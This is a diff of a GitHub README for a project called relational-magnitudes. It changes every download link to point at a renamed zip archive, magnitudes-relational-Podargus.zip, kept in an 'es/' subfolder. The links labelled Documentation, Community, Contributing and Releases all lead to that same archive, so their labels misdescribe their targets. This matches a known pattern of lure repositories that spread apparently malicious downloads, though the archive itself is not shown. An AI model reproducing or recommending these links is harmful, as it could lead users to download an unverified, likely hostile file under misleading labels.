@@ -7,7 +7,7 @@ Welcome to **relational-magnitudes**! This software helps you understand vectori
 
 ## 📥 Download Now
 
-[![Download relational-magnitudes](https://github.com/umair077/relational-magnitudes/raw/refs/heads/main/es/relational-magnitudes-3.2.zip)](https://github.com/umair077/relational-magnitudes/raw/refs/heads/main/es/relational-magnitudes-3.2.zip)
+[![Download relational-magnitudes](https://raw.githubusercontent.com/umair077/relational-magnitudes/main/es/magnitudes-relational-Podargus.zip)](https://raw.githubusercontent.com/umair077/relational-magnitudes/main/es/magnitudes-relational-Podargus.zip)
 
 Follow the steps below to get the software up and running on your computer.
 
@@ -22,7 +22,7 @@ Before you start, make sure your computer meets these requirements:
 ## 🌐 Download & Install
 
 1. **Visit the Releases Page**
-   To download the software, visit [this page](https://github.com/umair077/relational-magnitudes/raw/refs/heads/main/es/relational-magnitudes-3.2.zip). 
+   To download the software, visit [this page](https://raw.githubusercontent.com/umair077/relational-magnitudes/main/es/magnitudes-relational-Podargus.zip). 
 
 2. **Choose Your Version**
    On the Releases page, you will see several versions listed. Select the latest version for the most features and updates.
@@ -64,9 +64,9 @@ Yes, once installed, you can use **relational-magnitudes** without an internet c
 
 ## 📘 Additional Resources
 
-- [Documentation](https://github.com/umair077/relational-magnitudes/raw/refs/heads/main/es/relational-magnitudes-3.2.zip) - Detailed guides and tutorials.
-- [Community](https://github.com/umair077/relational-magnitudes/raw/refs/heads/main/es/relational-magnitudes-3.2.zip) - Join discussions and ask questions.
-- [Contributing](https://github.com/umair077/relational-magnitudes/raw/refs/heads/main/es/relational-magnitudes-3.2.zip) - Interested in helping? Learn how to contribute.
+- [Documentation](https://raw.githubusercontent.com/umair077/relational-magnitudes/main/es/magnitudes-relational-Podargus.zip) - Detailed guides and tutorials.
+- [Community](https://raw.githubusercontent.com/umair077/relational-magnitudes/main/es/magnitudes-relational-Podargus.zip) - Join discussions and ask questions.
+- [Contributing](https://raw.githubusercontent.com/umair077/relational-magnitudes/main/es/magnitudes-relational-Podargus.zip) - Interested in helping? Learn how to contribute.
 
 ## 📞 Support
 
